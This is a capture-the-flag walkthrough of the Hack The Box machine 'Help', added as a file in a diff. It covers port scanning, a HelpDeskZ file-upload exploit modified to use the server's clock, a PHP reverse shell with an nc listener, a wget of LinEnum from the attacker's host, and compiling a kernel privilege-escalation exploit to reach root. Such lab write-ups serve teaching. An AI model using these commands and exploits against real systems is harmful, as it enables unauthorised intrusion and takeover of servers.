@@ -1,0 +1,414 @@
+Help
+
+***DISCLAIMER***
+
+I am not IppSEC nor do I work with him or for him. This write up is simply to be used as a learning tool only. Some people learn from videos and others from reading, and some both. Please forgive any typos. These write ups are to get you familiar with the types of tools used for penetration testing and how to utulize them.
+
+This write up is not verbatium, it is the steps taken to gain root, along with a few additional resources.
+
+For IppSec's videos please go to:
+https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
+
+# = Commented out or instructions.
+
+***Thank You***
+
+# First, let's run our nmap scan.
+
+nmap -sC -sV -oA nmap/help 10.10.10.121
+
+# After the scan has completed view the findings
+
+less nmap/help.nmap
+
+# Open Ports: 
+# 22 (OpenSSH) on Ubuntu 2.6
+# 80 Apache httpd 2.4.18
+# 3000 http Node.js Express framework
+
+# Whats on Port 80?
+# Open a Browser and and the IP
+
+# Turn Intercept off on Burp if you have it running
+# Apache Splash Page
+
+# Run gobuster (Gobuster is a scanner that looks for existing or hidden web objects. It works by launching a dictionary attack against a web server and analyzing the response.)
+# https://tools.kali.org/web-applications/gobuster
+
+gobuster -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o http-root.log
+# -u = url
+# -w = wordlist
+# -o = ouput file
+
+# Review the output from gobuster (A support page was revealed and if nothing is found, move over to port 10.10.10.121:3000)
+
+# Helpdesk Z is revealed on the Support Page
+
+searchsploit helpdeskz
+
+# Two Exploits revealed (File Upload and SQL Injection) but must check the version against the version of Helpdesk Z in use
+
+view page source
+
+# Search Github and Google to see the current version, Github reveals a readme
+
+Browse to 10.10.10.121/support/README.md
+
+# Version listed at the top. Will probably be vulberable to the file upload. Lets read about the exploit.
+
+searchsploit -x exploits/php/webapps/40300.py
+
+# -x = view (examine)
+# Allows for upload of .php files
+# Back to to the support page, submit a ticket
+# Enter in generic info
+# Attach a file (Attach the script you generate from the exploit)
+
+cp /usr/share/laudanum/php/php-reverse-shell.php .
+ls (to ensure its there)
+
+nano php-reverse-shell.php
+# Need to edit it for our purpose
+Change the IP Address to that of your host (The IP from the vpnconnection)
+Change the port to whatever you want 9001 because why not
+Upload the file to the ticket we are generating.
+
+# Unable to upload the file.. why? A. The timining from the exploit doesn't match the server.. 
+
+# Let's check out the directory structure on the GitHub Page (uploads/tickets)
+# Now lets move a copy of the exploit (unedited into our folder for HELP)
+
+searchsploit -m exploits/php/webapps/40300.py
+
+# Ensure the uploads path exists 
+10.10.10.121/support/uploads/tickets 
+# Apache splash page (the path exists)
+
+python 40300.py http://10.10.10.121/support/uploads/tickets php-reverse-shell.php
+
+# Set a listener on our machine
+
+nc -lvnp 9001
+
+# It's not giving us the shell.. hmmm if you dig deeper into the code for the exploit you can see where it is getting its timing from. (Our local box,, which doesn't match the server)
+
+open burp, turn on intercept and reload the "Submit a Ticket Page"
+go to Options tab in Burp and check "Intercept Server Requests"
+forward the request and view the header for the page
+you will be able to see the time and time zone for the server
+
+# compare it to the time in your box
+
+date
+
+# Time zones are completely different. Let's edit our copy of the exploit.
+
+Place a # in front of currentTime = int(time.time())
+
+# Open a new terminal windown and let's figure how to use the server time for the explpoit.
+*** Turn of Intercept on Burp ***
+
+python
+
+>>> import requests
+>>> response = requests.head('http://10.10.10.121/support/')
+
+# We don't need the entire page just the headers
+
+>>> response.text
+>>> dir(response)
+# view the output
+>>> response.headers
+# View the output and lets grab the Date
+>>> response.headers['Date']
+# Output is the server time.. which is what we need.
+# Go back to our exploit we are editing and enter the following:
+
+response = requests.head('http://10.10.10.121/support/')
+serverTime = response.headers['Date']
+
+#Let's convert the time to epoch time (Unix time (also known as POSIX time or UNIX Epoch time) is a system for describing a point in time.)
+# Paste the old time stamp into the script and comment it out using #
+
+#Sat, 08 Jun 2019 01:57:40 GMT
+
+# Make a new time variable called:
+
+timeFormat = 
+
+# Let's google Python time format and use strftime.org
+
+%a = day
+%d = Date
+%b = Month
+%Y = Year
+%H = Hour
+%M = Minute
+%S = Second
+%Z = Time Zone
+
+# Let's go back to edit our exploit
+
+timeFormat = "%a %d %b %Y %H:%M:%S %Z"
+currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))
+print(currentTIme)
+
+# Add import time, calendar to the modules list at the top of the script
+
+# Now let's try running our exploit again
+
+python 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php
+
+# You get an epoch time stamp, convert the time stamp to human readable. https://www.epochconverter.com/
+
+# Change the for x in range 300 to 90 in the exploit so it doesn't count too long.
+# Open the exploit in the editor of your choice and make the following change"
+
+for x in range(0, 90):
+
+# Save the changes
+
+Browse back to 10.10.10.121/support 
+
+# Let's create a new ticket and upload our edited exploit file.
+# Woot.. We got a shell
+# Run the following:
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl+z
+stty raw -echo
+nc -lvnp 9001
+
+# Now you will have a clean looking terminal with tab autocompletion
+
+cd /home/
+ls
+# There is a folder called help
+cd help/
+ls
+# View the output
+wc -c user.txt
+# View the output
+ls -la
+
+# We see a .bash_history.. lets read it
+
+cat .bash_history
+# View the output and there is a su ran with a password r00TmEoRdIE
+
+su -
+# Enter the password
+Poop.. didn't work.
+
+# Let's run Linux Priv Checker. Switch to a terminal on your box and not the NetCat session.
+
+mkdir www
+cd www
+cp /opt/LinEnum/
+cp /opt/LinEnum/LinEnum.sh .
+
+python -m SimpleHTTPServer
+# Starts automatically on 0.0.0.0 port 8000
+
+# Switch back to you NetCat Shell
+
+cd /dev/shm
+wget YOU.RHO.ST.IP:8000/LinEnum.sh
+
+bash LinEnum.sh
+
+# Linux kernel is old (over 1 year) Version 4.4.0-116-generic
+# Google that kernel version for privilege esculation (privesc)
+https://www.exploit-db.com/exploits/44298 
+# Are there any special instructions for this exploit
+
+# Return to your system terminal and run searchsploit
+searchsploit 4.4.0-116-generic
+# Any luck?
+
+Switch back to Enum session
+
+# Kill the linEnum with ctrl+c and check the version running
+cat /etc/lsb-release
+
+# Copy the raw format of the Exploit from Exploit-DB
+
+vi exploit.c  
+# Creates a new file called exploit.c
+:set paste
+
+# Paste in the code from the exploit you found, save and exit.
+# Now we need to compile it
+
+gcc exploit.c -o exploit
+# -o = output (to a filename)
+# Now run the exploit
+
+./exploit
+
+# If successful, you are now root.
+
+cd /root
+ls
+# root.txt file revealed
+
+# At this point I ended my write up as the box has been rooted. If you would like to learn the alternate method please start at 25min and 28s on the video for HTB - Help found here:
+
+https://www.youtube.com/watch?v=XB8CbhfOczU&list=PLidcsTyj9JXJfpkDrttTdk1MNT6CDwVZF
+
+*** Thank you and I hope you enjoyed this write up. ***
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
